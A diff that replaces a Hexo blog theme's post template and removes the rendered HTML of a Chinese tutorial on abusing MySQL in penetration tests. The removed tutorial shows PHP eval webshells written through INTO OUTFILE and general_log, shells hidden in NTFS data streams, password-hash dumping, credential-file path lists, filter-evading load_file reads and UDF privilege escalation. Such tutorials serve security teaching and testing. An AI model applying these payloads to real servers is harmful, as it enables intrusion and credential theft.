@@ -1,344 +1,52 @@
-<!DOCTYPE html><html lang="zh-Hans"><head><meta name="generator" content="Hexo 3.8.0"><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description"><title>Mysql 在渗透测试中的利用 | K0rz3n's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/normalize/8.0.1/normalize.min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//lib.baomitu.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//lib.baomitu.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//lib.baomitu.com/jquery/3.4.0/jquery.min.js"></script><link rel="icon" mask sizes="any" href="/favicon.ico"><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Mysql 在渗透测试中的利用</h1><a id="logo" href="/.">K0rz3n's Blog</a><p class="description">Shell-is-Only-the-Beginning</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Mysql 在渗透测试中的利用</h1><div class="post-meta">Oct 21, 2018<span> | </span><span class="category"><a href="/categories/web安全/">web安全</a></span><script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script><span id="busuanzi_container_page_pv"> | <span id="busuanzi_value_page_pv"></span><span> Hits</span></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">Contents</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#一、渗透中可利用的-mysql-的点"><span class="toc-number">1.</span> <span class="toc-text">一、渗透中可利用的 mysql 的点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-写-webshell"><span class="toc-number">1.1.</span> <span class="toc-text">1.写 webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-select-into-outfile-要有-root-权限"><span class="toc-number">1.1.1.</span> <span class="toc-text">1.select into outfile(要有 root 权限)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-使用-general-log-写-shell-需要-sql-root-权限"><span class="toc-number">1.1.2.</span> <span class="toc-text">2.使用 general_log 写 shell(需要 sql root 权限)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-使用-echo-命令直接写-shell-基于UDF-提权"><span class="toc-number">1.1.3.</span> <span class="toc-text">3.使用 echo 命令直接写 shell(基于UDF 提权)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-隐藏webshell-配合-echo-写-shell"><span class="toc-number">1.1.4.</span> <span class="toc-text">4.隐藏webshell(配合 echo 写 shell)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-将一句话作为数据表的字段-配合文件包含"><span class="toc-number">1.1.5.</span> <span class="toc-text">5.将一句话作为数据表的字段(配合文件包含)</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-一些补充："><span class="toc-number">1.1.6.</span> <span class="toc-text">6.一些补充：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-直接查询用户的密码"><span class="toc-number">1.2.</span> <span class="toc-text">2.直接查询用户的密码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-load-file-使用注意："><span class="toc-number">1.3.</span> <span class="toc-text">3.load_file()使用注意：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-win-下常见的敏感文件："><span class="toc-number">1.3.1.</span> <span class="toc-text">(1)win 下常见的敏感文件：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-Linux-下常见的敏感文件"><span class="toc-number">1.3.2.</span> <span class="toc-text">(2)Linux 下常见的敏感文件</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-查看哪些账号哪些主机能够连接"><span class="toc-number">1.4.</span> <span class="toc-text">4.查看哪些账号哪些主机能够连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-查看当前账号的权限"><span class="toc-number">1.5.</span> <span class="toc-text">5.查看当前账号的权限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-查看-Mysql-结构-和-操作系统的结构"><span class="toc-number">1.6.</span> <span class="toc-text">6.查看 Mysql 结构 和 操作系统的结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-into-outfile-和-into-dunmpfile-的区别"><span class="toc-number">1.7.</span> <span class="toc-text">7.into outfile 和 into dunmpfile 的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-查看-MySQL-的安装路径"><span class="toc-number">1.8.</span> <span class="toc-text">8.查看 MySQL 的安装路径</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-MYSQL-数据库user表"><span class="toc-number">1.9.</span> <span class="toc-text">9.MYSQL 数据库user表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-怎么找-Mysql-的账号密码"><span class="toc-number">1.10.</span> <span class="toc-text">10.怎么找 Mysql 的账号密码</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#方法一：翻配置文件"><span class="toc-number">1.10.1.</span> <span class="toc-text">方法一：翻配置文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法二：找历史记录"><span class="toc-number">1.10.2.</span> <span class="toc-text">方法二：找历史记录</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#三、MYSQL-UDF-提权"><span class="toc-number">2.</span> <span class="toc-text">三、MYSQL UDF 提权</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-什么是-UDF"><span class="toc-number">2.1.</span> <span class="toc-text">1.什么是 UDF</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-放在哪里"><span class="toc-number">2.2.</span> <span class="toc-text">2.放在哪里</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-怎么放进去"><span class="toc-number">2.3.</span> <span class="toc-text">3.怎么放进去</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#udf-dll-在哪"><span class="toc-number">2.3.1.</span> <span class="toc-text">udf.dll 在哪</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法一：远程加载"><span class="toc-number">2.3.2.</span> <span class="toc-text">方法一：远程加载</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法二：HEX-写入"><span class="toc-number">2.3.3.</span> <span class="toc-text">方法二：HEX 写入</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法三：分段写入数据表中，然后-select-那个字段"><span class="toc-number">2.3.4.</span> <span class="toc-text">方法三：分段写入数据表中，然后 select 那个字段</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#方法四：利用函数-to-base64-和-from-base64"><span class="toc-number">2.3.5.</span> <span class="toc-text">方法四：利用函数 to_base64 和 from_base64</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-怎么利用这个-dll"><span class="toc-number">2.4.</span> <span class="toc-text">4.怎么利用这个 dll</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-sys-exec"><span class="toc-number">2.4.1.</span> <span class="toc-text">1.sys_exec()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-sys-evel"><span class="toc-number">2.4.2.</span> <span class="toc-text">2.sys_evel()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-sys-get"><span class="toc-number">2.4.3.</span> <span class="toc-text">3.sys_get()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-执行Shellcode-sys-bineval"><span class="toc-number">2.4.4.</span> <span class="toc-text">4.执行Shellcode - sys_bineval</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-补充一些-trick"><span class="toc-number">2.4.5.</span> <span class="toc-text">5.补充一些 trick</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#1-导出文件名的问题"><span class="toc-number">2.4.5.1.</span> <span class="toc-text">1.导出文件名的问题</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#2-不存在plugin-目录的问题"><span class="toc-number">2.4.5.2.</span> <span class="toc-text">2.不存在plugin 目录的问题</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-什么是-NTFS-的-ADS"><span class="toc-number">2.4.5.2.1.</span> <span class="toc-text">1.什么是 NTFS  的 ADS</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-怎么在只能导出文件的情况下导出一个文件夹"><span class="toc-number">2.4.5.2.2.</span> <span class="toc-text">2.怎么在只能导出文件的情况下导出一个文件夹</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-试一下使用-mysql-导出文件的方法能不能成功"><span class="toc-number">2.4.5.2.3.</span> <span class="toc-text">2.试一下使用 mysql 导出文件的方法能不能成功</span></a></li></ol></li><li class="toc-item toc-level-5"><a class="toc-link" href="#3-能执行命令以后我们能做更多"><span class="toc-number">2.4.5.3.</span> <span class="toc-text">3.能执行命令以后我们能做更多</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-先看一下-3389-开没开："><span class="toc-number">2.4.5.3.1.</span> <span class="toc-text">(1)先看一下 3389 开没开：</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#参考"><span class="toc-number">3.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="post-content"><h2 id="一、渗透中可利用的-mysql-的点"><a href="#一、渗透中可利用的-mysql-的点" class="headerlink" title="一、渗透中可利用的 mysql 的点"></a><strong>一、渗透中可利用的 mysql 的点</strong></h2><h3 id="1-写-webshell"><a href="#1-写-webshell" class="headerlink" title="1.写 webshell"></a><strong>1.写 webshell</strong></h3><h4 id="1-select-into-outfile-要有-root-权限"><a href="#1-select-into-outfile-要有-root-权限" class="headerlink" title="1.select into outfile(要有 root 权限)"></a><strong>1.select into outfile(要有 root 权限)</strong></h4><p>这个利用方式必须要是 root 登录权限，使用 select xxx ito outfile xxx 的形式，这个语句原来是用于快速导出某个表中的数据，或者整个表的，现在我们将我们的n 查询语句导出为 PHP 文件到 web 目录下</p>
-<pre><code>Select &apos;&lt;?php eval($_POST[cmd])?&gt;&apos; into outfile &apos;E:\phpstudy\PHPTutorial\WWW\123123.php&apos;;
-</code></pre><p>但是使用这个语句的时候可能会出现几个问题：</p>
-<p>(1)权限不够，我刚刚说过了，这个语句的使用必须是 root 权限,如果你非要尝试那只能得到下面的结果:</p>
-<pre><code>Access denied for user &apos;test&apos;@&apos;localhost&apos; (using password: YES)
-</code></pre><p>(2)受到 secure_file_priv 的限制，这个参数可以使用 mysql 命令行查询，查询语句如下：</p>
-<pre><code>show variables like &apos;%secure%&apos;;
-</code></pre><a id="more"></a>
-<p>mysql 新版本下secure-file-priv字段 ： secure-file-priv参数是用来限制LOAD DATA, SELECT … OUTFILE, and LOAD_FILE()传到哪个指定目录的。</p>
-<pre><code>ure_file_priv的值为null ，表示限制mysqld 不允许导入|导出
+extends base
 
-当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下
+block title
+  title= page.title + ' | ' + config.title
 
-当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制
-</code></pre><p><strong>补充：</strong></p>
-<p>这个命令本身就是导出表的，我们创建表当然可以</p>
-<pre><code>CREATE TABLE `mysql`.`K0rz3n` (`K0rz3n1` TEXT NOT NULL ); 
-INSERT INTO `mysql`.`K0rz3n` (`K0rz3n1` ) VALUES (&apos;&lt;?php @eval($_POST 
-[pass]);?&gt;&apos;); 
-SELECT `K0rz3n1` FROM `K0rz3n` INTO OUTFILE &apos;d:/www/exehack.php&apos;; 
-DROP TABLE IF EXISTS `K0rz3n`;
-</code></pre><h4 id="2-使用-general-log-写-shell-需要-sql-root-权限"><a href="#2-使用-general-log-写-shell-需要-sql-root-权限" class="headerlink" title="2.使用 general_log 写 shell(需要 sql root 权限)"></a><strong>2.使用 general_log 写 shell(需要 sql root 权限)</strong></h4><p>上面说了，直接导出数据容易受到 secure_file_priv 的限制，那么这个时候怎么办？这种情况下可以通过general_log和general_log_file来获取webshell</p>
-<p>mysql打开general log之后，所有的查询语句都可以在general log文件中以可读的方式得到，但是这样general log文件会非常大，所以默认都是关闭的。有的时候为了查错等原因，还是需要暂时打开general log的。换句话说general_log_file会记录所有的查询语句，以原始的状态来显示，<strong>在每一次更改general log file的时候mysql都会判断日志文件是否存在，如果不存在则会自动创建。</strong>如果将general_log开关打开，general_log_file设置为一个php文件，则查询的操作将会全部写入到general_log_file指定的文件，通过访问general_log_file指定的文件来获取webshell。</p>
-<p><strong>我们先来看一下我的默认的配置</strong></p>
-<pre><code>mysql&gt; show variables like &quot;%general%&quot;;
-+------------------+--------------------------------------------------------+
-| Variable_name    | Value                                                  |
-+------------------+--------------------------------------------------------+
-| general_log      | OFF                                                    |
-| general_log_file | E:\phpstudy\PHPTutorial\MySQL\data\DESKTOP-S2L4C24.log |
-+------------------+--------------------------------------------------------+
-2 rows in set (0.00 sec)
-</code></pre><p>可以看到，general_log 的确默认是关闭的，文件的位置是 一个明确的日志文件，不过没关系我们是 root 权限的话，这些不都是在我们的掌控之中?</p>
-<p><strong>改一波，走你！</strong></p>
-<pre><code>set global general_log=&apos;on&apos;;
-SET global general_log_file=&apos;E:/phpstudy/PHPTutorial/WWW/cmd.php&apos;;
-SELECT &apos;&lt;?php assert($_POST[&quot;cmd&quot;]);?&gt;&apos;;
-</code></pre><p><strong>再看一下配置：</strong></p>
-<pre><code>mysql&gt; show variables like &quot;%general%&quot;;
-+------------------+-------------------------------------+
-| Variable_name    | Value                               |
-+------------------+-------------------------------------+
-| general_log      | ON                                  |
-| general_log_file | E:/phpstudy/PHPTutorial/WWW/cmd.php |
-+------------------+-------------------------------------+
-2 rows in set (0.00 sec)
-</code></pre><p>再看一下 cmd.php 是不是真的存在</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%86%99%20shell.png" alt="此处输入图片的描述"></p>
-<p>接下来我们愉快的访问就行了</p>
-<h4 id="3-使用-echo-命令直接写-shell-基于UDF-提权"><a href="#3-使用-echo-命令直接写-shell-基于UDF-提权" class="headerlink" title="3.使用 echo 命令直接写 shell(基于UDF 提权)"></a><strong>3.使用 echo 命令直接写 shell(基于UDF 提权)</strong></h4><p>这种情况是在能执行系统命令的时候采用的</p>
-<pre><code>echo ^&lt;?php @eval(request[xxx])? ^^&gt;^ &gt;c:\web\www\shell.php
-</code></pre><p>win 下面能直接这样写，其中 ^ 的是为了转义 &lt; 字符</p>
-<p><strong>这个命令能在 UDF 提权以后成功执行，创建 webshell</strong></p>
-<h4 id="4-隐藏webshell-配合-echo-写-shell"><a href="#4-隐藏webshell-配合-echo-写-shell" class="headerlink" title="4.隐藏webshell(配合 echo 写 shell)"></a><strong>4.隐藏webshell(配合 echo 写 shell)</strong></h4><p>在服务器上echo一个数据流文件进去，比如index.php是网页正常文件，我们可以这样子搞：</p>
-<pre><code>echo ^&lt;?php @eval(request[xxx])? ^&gt;&gt; index.php:a.jpg
-</code></pre><p>这样子就生成了一个不可见的shell a.jpg，常规的文件管理器、type命令，dir命令、del命令发现都找不出那个a.jpg的。我们可以在另外一个正常文件里把这个ADS文件include进去，这样子就可以正常解析我们的一句话了。</p>
-<h4 id="5-将一句话作为数据表的字段-配合文件包含"><a href="#5-将一句话作为数据表的字段-配合文件包含" class="headerlink" title="5.将一句话作为数据表的字段(配合文件包含)"></a><strong>5.将一句话作为数据表的字段(配合文件包含)</strong></h4><p>如果我们有创建表的权限，我们完全可以将表的某个字段写成一个一句话，然后我们找到这个表对应的文件包含之</p>
-<p><strong>如图所示：</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E8%A1%A8%E5%AD%97%E6%AE%B5%E5%86%99%20shell.png" alt="此处输入图片的描述"></p>
-<p>我们知道数据库的一起都是以文件的形式存在的，我们来找一下这个文件</p>
-<p><strong>如图所示:</strong></p>
-<p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E5%86%99%E5%85%A5shell.png" alt="此处输入图片的描述"></p>
-<h4 id="6-一些补充："><a href="#6-一些补充：" class="headerlink" title="6.一些补充："></a><strong>6.一些补充：</strong></h4><p>Test.php 文件内容为 <code>&lt;?php phpinfo();?&gt;</code></p>
-<pre><code>Test.php:a.jpg     会生成Test.php  文件内容为空
+block content
+  .post
+    h1.post-title= page.title
+    .post-meta= page.date.format('ll')
+      if page.categories.length > 0
+        span= ' | '
+        span.category
+          for category in page.categories.toArray()
+            a(href=url_for(category.path))= category.name
+      if theme.busuanzi == true
+        script(src='https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js', async)
+        span#busuanzi_container_page_pv= ' | '
+          span#busuanzi_value_page_pv
+          span= ' ' + __('Hits')
+    if theme.duoshuo
+      a.ds-thread-count(data-thread-key=page.path, href=url_for(page.path) + '#comments')
+    if theme.disqus
+      a.disqus-comment-count(data-disqus-identifier=page.path, href=url_for(page.path) + '#disqus_thread')
+    if theme.gentie
+      a.ds-thread-count(class='cloud-tie-join-count', href=url_for(page.path) + '#comments')
+        span.join-count(style='font-size: 15px; color: #6E7173;') 0
+        span= ' ' + __('Discuss')
 
-Test.php::$DATA  生成test.php  文件内容为&lt;?php phpinfo();?&gt;
-
-Test.php::$INDEX_ALLOCATION  生成test.php文件夹
-
-Test.php::$DATA\0.jpg  生成0.jpg  文件内容为&lt;?php phpinfo();?&gt;
-
-Test.php::$DATA\aaa.jpg  生成aaa.jpg  文件内容为&lt;?php phpinfo();?&gt;
-</code></pre><h3 id="2-直接查询用户的密码"><a href="#2-直接查询用户的密码" class="headerlink" title="2.直接查询用户的密码"></a><strong>2.直接查询用户的密码</strong></h3><p>这方法同样需要 root 权限</p>
-<pre><code>select user,password from mysql.user；
-</code></pre><p>然后你会看到一堆乱七八糟的字符，下面说一下 mysql 对密码的加密方式</p>
-<pre><code>password_str = concat(‘*’, sha1(unhex(sha1(password))))
-</code></pre><h3 id="3-load-file-使用注意："><a href="#3-load-file-使用注意：" class="headerlink" title="3.load_file()使用注意："></a><strong>3.load_file()使用注意：</strong></h3><p>load_file() 的作用是读取文件的内容，并将文件内容以字符串的形式返回，这个函数在渗透的过程中尤其的好用，但是这个函数的使用依然受到权限的限制以及 secure_file_Priv 的限制</p>
-<pre><code>select load_file(&quot;文件路径&quot;)；
-</code></pre><h4 id="1-win-下常见的敏感文件："><a href="#1-win-下常见的敏感文件：" class="headerlink" title="(1)win 下常见的敏感文件："></a><strong>(1)win 下常见的敏感文件：</strong></h4><pre><code>c:/boot.ini //查看系统版本 
-c:/windows/php.ini //php配置信息 
-c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 
-c:/winnt/php.ini 
-c:/winnt/my.ini 
-c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 
-c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 
-c:\Program Files\Serv-U\ServUDaemon.ini 
-c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 
-c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码 
-c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 
-c:\Program Files\RhinoSoft.com\ServUDaemon.exe 
-C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 
-//存储了pcAnywhere的登陆密码 
-c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件 
-c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. 
-c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 
-d:\APACHE\Apache2\conf\httpd.conf 
-C:\Program Files\mysql\my.ini 
-C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码
-</code></pre><h4 id="2-Linux-下常见的敏感文件"><a href="#2-Linux-下常见的敏感文件" class="headerlink" title="(2)Linux 下常见的敏感文件"></a><strong>(2)Linux 下常见的敏感文件</strong></h4><pre><code>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件 
-/usr/local/apache2/conf/httpd.conf 
-/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 
-/usr/local/app/php5/lib/php.ini //PHP相关设置 
-/etc/sysconfig/iptables //从中得到防火墙规则策略 
-/etc/httpd/conf/httpd.conf // apache配置文件 
-/etc/rsyncd.conf //同步程序配置文件 
-/etc/my.cnf //mysql的配置文件 
-/etc/redhat-release //系统版本 
-/etc/issue 
-/etc/issue.net 
-/usr/local/app/php5/lib/php.ini //PHP相关设置 
-/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置 
-/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件
-/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 
-/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 
-/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 
-/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件 
-/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看 
-/usr/local/resin-pro-3.0.22/conf/resin.conf 同上 
-/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看 
-/etc/sysconfig/iptables 查看防火墙策略 
-load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 
-replace(load_file(0×2F6574632F706173737764),0×3c,0×20) 
-replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))
-</code></pre><h3 id="4-查看哪些账号哪些主机能够连接"><a href="#4-查看哪些账号哪些主机能够连接" class="headerlink" title="4.查看哪些账号哪些主机能够连接"></a><strong>4.查看哪些账号哪些主机能够连接</strong></h3><p>前提是有 root 账号，能查询  mysql.user 表</p>
-<pre><code>select * from mysql.user;
-</code></pre><p>这其中有一个 host 字段能显示，该账号允许的登录地址，如果是 127.0.0.1 就是只允许本机登录，如果出现了 192.168.1.%,表明整个C段的主机使用该账号登录</p>
-<h3 id="5-查看当前账号的权限"><a href="#5-查看当前账号的权限" class="headerlink" title="5.查看当前账号的权限"></a><strong>5.查看当前账号的权限</strong></h3><pre><code>select * from mysql.user where user = substring_index(user(), &apos;@&apos;, 1) ;
-</code></pre><p>这个为什么我要拿出来说一下，虽然感觉和上面的是一样的，但是这里用到了  substrijng_index 这个函数，没有输入当前账号的名称，可能在某些情况能利用它绕过一些东西，于是就记录一下</p>
-<h3 id="6-查看-Mysql-结构-和-操作系统的结构"><a href="#6-查看-Mysql-结构-和-操作系统的结构" class="headerlink" title="6.查看 Mysql 结构 和 操作系统的结构"></a><strong>6.查看 Mysql 结构 和 操作系统的结构</strong></h3><p>我们可以使用全局变量的方式查看这些信息</p>
-<p>下面命令向我们展示了MySQL结构，操作系统的结构</p>
-<pre><code>mysql&gt; select @@version_compile_os,@@version_compile_machine;
-+----------------------+---------------------------+
-| @@version_compile_os | @@version_compile_machine |
-+----------------------+---------------------------+
-| Win32                | AMD64                     |
-+----------------------+---------------------------+
-1 row in set (0.00 sec)
-</code></pre><p>或者</p>
-<pre><code>mysql&gt; show variables like &apos;%compile%&apos;;\
-+-------------------------+-------+
-| Variable_name           | Value |
-+-------------------------+-------+
-| version_compile_machine | AMD64 |
-| version_compile_os      | Win32 |
-+-------------------------+-------+
-2 rows in set (0.00 sec)
-</code></pre><h3 id="7-into-outfile-和-into-dunmpfile-的区别"><a href="#7-into-outfile-和-into-dunmpfile-的区别" class="headerlink" title="7.into outfile 和 into dunmpfile 的区别"></a><strong>7.into outfile 和 into dunmpfile 的区别</strong></h3><p>这两个操作在 渗透测试中的作用不可小觑，不要以为长得差不多，他们的功能是有侧重的</p>
-<p>into outfile 主要的目的是导出 文本文件，我们在渗透过程中是用来写 shell 的<br>into dumpfile 的主要目的是导出二进制文件，在后面我们讲到 UDF 提权的过程中会经常用到这个函数生成我们的 udf.dll </p>
-<h3 id="8-查看-MySQL-的安装路径"><a href="#8-查看-MySQL-的安装路径" class="headerlink" title="8.查看 MySQL 的安装路径"></a><strong>8.查看 MySQL 的安装路径</strong></h3><pre><code>mysql&gt; select @@basedir;
-+-------------------------+
-| @@basedir               |
-+-------------------------+
-| E:\mysql-5.6.41-winx64\ |
-+-------------------------+
-1 row in set (0.00 sec)
-
-
-mysql&gt; show variables like &apos;%plugin%&apos;;
-+---------------+------------------------------------+
-| Variable_name | Value                              |
-+---------------+------------------------------------+
-| plugin_dir    | E:\mysql-5.6.41-winx64\lib\plugin\ |
-+---------------+------------------------------------+
-1 row in set (0.00 sec)
-</code></pre><h3 id="9-MYSQL-数据库user表"><a href="#9-MYSQL-数据库user表" class="headerlink" title="9.MYSQL 数据库user表"></a><strong>9.MYSQL 数据库user表</strong></h3><p>这个表里面藏着很多的好东西，和这个表有关的一共有三个文件即user.frm、user.MYD和 user.MYI，MYSQL数据库用户密码都保存在user.MYD文件中，包括root用户和其他用户的密码。在有权限的情况下，我们可以将User.frm、user.myd和User.myi三个文件下载到本地，通过本地的mysql环境直接读取user表中的数据。当然也可使用文本编辑器将user.MYD打开将root账号的密码复制出来到到cmd5.com进行查询和破解</p>
-<h3 id="10-怎么找-Mysql-的账号密码"><a href="#10-怎么找-Mysql-的账号密码" class="headerlink" title="10.怎么找 Mysql 的账号密码"></a><strong>10.怎么找 Mysql 的账号密码</strong></h3><h4 id="方法一：翻配置文件"><a href="#方法一：翻配置文件" class="headerlink" title="方法一：翻配置文件"></a><strong>方法一：翻配置文件</strong></h4><p>我们知道，如果是网站的项目，就一定会有和数据库的链接配置文件，我们可以从这个文件中找到连接数据库的账号密码，如果控制的不好就是 root 权限，很有利于我们的提权</p>
-<pre><code>1.dedecms数据库安装的信息就是写在data/common.inc.php
-
-2.Discuz的数据库信息就在config/config_global_default.php、config /config_ucenter.php、config.inc.php
-
-3.对于java会在/WEB-INF/config/config.properties中配置
-</code></pre><p>一般数据库配置文件都会位于config、application、conn、db等目录，配置文件名称一般会是conn.asp/php/aspx/jsp等。</p>
-<h4 id="方法二：找历史记录"><a href="#方法二：找历史记录" class="headerlink" title="方法二：找历史记录"></a><strong>方法二：找历史记录</strong></h4><p>除了在文件中找以外，如果是 linux 系统，我们可以查看系统的历史命令，查看 ./root/.mysql_history、./root/.bash_history文件找mysql操作涉及的密码</p>
-<p>对于 低版本的 MYSQL（5.1） 一下的，对用户名和密码的传输是不加密的，我们可以找到 binary log 文件找密码 </p>
-<h2 id="三、MYSQL-UDF-提权"><a href="#三、MYSQL-UDF-提权" class="headerlink" title="三、MYSQL UDF 提权"></a><strong>三、MYSQL UDF 提权</strong></h2><h3 id="1-什么是-UDF"><a href="#1-什么是-UDF" class="headerlink" title="1.什么是 UDF"></a><strong>1.什么是 UDF</strong></h3><p>那么什么是 UDF ？ 全称是 User defined function(用户自定义函数)，一听这个名字就知道我的基础权限要求还是很高的，要求数据库 root 权限<br>当我们有读取和写入权限以后，我们就可以尝试使用 udf 提权的方法，从数据库的 root 权限提升到 系统的管理员权限</p>
-<h3 id="2-放在哪里"><a href="#2-放在哪里" class="headerlink" title="2.放在哪里"></a><strong>2.放在哪里</strong></h3><p>因为叫 UDF 于是我们能编写自己的 DLL 然后让 mysql 调用，实现我们自定义的命令</p>
-<p>从MySQL 5.0.67开始，UDF库必须包含在plugin文件夹中，可以使用‘@@plugin_dir’全局变量找到它。这个变量可以在mysql.ini文件中看到和编辑。</p>
-<pre><code>mysql&gt; select @@plugin_dir;
-+-------------------------------------------+
-| @@plugin_dir                              |
-+-------------------------------------------+
-| E:\phpstudy\PHPTutorial\MySQL\lib\plugin\ |
-+-------------------------------------------+
-
-mysql&gt; show variables like &apos;plugin%&apos;;
-+---------------+-------------------------------------------+
-| Variable_name | Value                                     |
-+---------------+-------------------------------------------+
-| plugin_dir    | E:\phpstudy\PHPTutorial\MySQL\lib\plugin\ |
-+---------------+-------------------------------------------+
-1 row in set (0.00 sec)
-</code></pre><p>从MySQL 5.0.67开始，文件必须位于plugin目录中。该目录取决于plugin_dir系统变量的值。如果plugin_dir的值为空，则参照5.0.67之前即文件必须位于系统动态链接器的搜索目录中。</p>
